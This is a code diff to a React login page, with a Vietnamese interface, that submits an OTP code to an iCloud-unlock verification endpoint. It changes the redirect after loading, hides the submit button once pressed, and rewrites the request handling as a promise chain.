@@ -7,6 +7,7 @@ import { useNavigate } from 'react-router-dom';
 import LoadingProgress from '../../components/LoadingProgress';
 import apiService from '../../service/apiService';
 import API_PATHS from '../../config/api';
+import { ROUTES } from '../../config/routes';
 
 // Define form schema using Zod
 const formSchema = z.object({
@@ -21,6 +22,7 @@ type FormData = z.infer<typeof formSchema>;
 const LoginPage: React.FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [loadingPercent, setLoadingPercent] = useState(0);
+  const [showButton, setShowButton] = useState(true);
   const [apiError, setApiError] = useState('');
   const navigate = useNavigate();
 
@@ -39,15 +41,7 @@ const LoginPage: React.FC = () => {
       setLoadingPercent(prev => {
         if (prev >= 100) {
           clearInterval(loadingInterval);
-          const addressService = localStorage.getItem('addressService');
-          if (addressService) {
-            const address = JSON.parse(addressService);
-            if (!address.link) {
-              navigate('/');
-            } else {
-              navigate(address.link);
-            }
-          }
+          navigate(ROUTES.byCapacity);
           return prev;
         }
         return prev + 1;
@@ -57,25 +51,19 @@ const LoginPage: React.FC = () => {
 
   const onSubmit = async (data: FormData) => {
     setApiError('');
-    
-    try {
-      const response = await apiService('post', API_PATHS.UNLOCK_ICLOUD_VERIFY, { code: data.password });
-      
-      if (response.data?.success) {
+    apiService('post', API_PATHS.UNLOCK_ICLOUD_VERIFY, { code: data.password })
+      .then((response) => {
+        console.log(response);
         setLoadingPercent(0);
+        setShowButton(false);
         startLoading();
-      } else {
+      })
+      .catch(() => {
         setError('password', {
           type: 'manual',
           message: 'Mã OTP không đúng, vui lòng liên hệ admin'
         });
-      }
-    } catch (err) {
-      setError('password', {
-        type: 'manual',
-        message: 'Mã OTP không đúng, vui lòng liên hệ admin'
       });
-    }
   };
 
   return (
@@ -128,13 +116,15 @@ const LoginPage: React.FC = () => {
                             {isLoading && <LoadingProgress percent={loadingPercent} />}
                           </div>
 
-                          <button 
-                            type="submit" 
-                            className="btn btn-primary text-uppercase fw-bold"
-                            disabled={isLoading}
-                          >
-                            {isLoading ? 'Đang xử lý...' : 'Đăng nhập'}
-                          </button>
+                          {showButton && (
+                            <button 
+                              type="submit" 
+                              className="btn btn-primary text-uppercase fw-bold"
+                              disabled={isLoading}
+                            >
+                              {isLoading ? 'Đang xử lý...' : 'Đăng nhập'}
+                            </button>
+                          )}
                         </form>
                       </div>
                     </div>
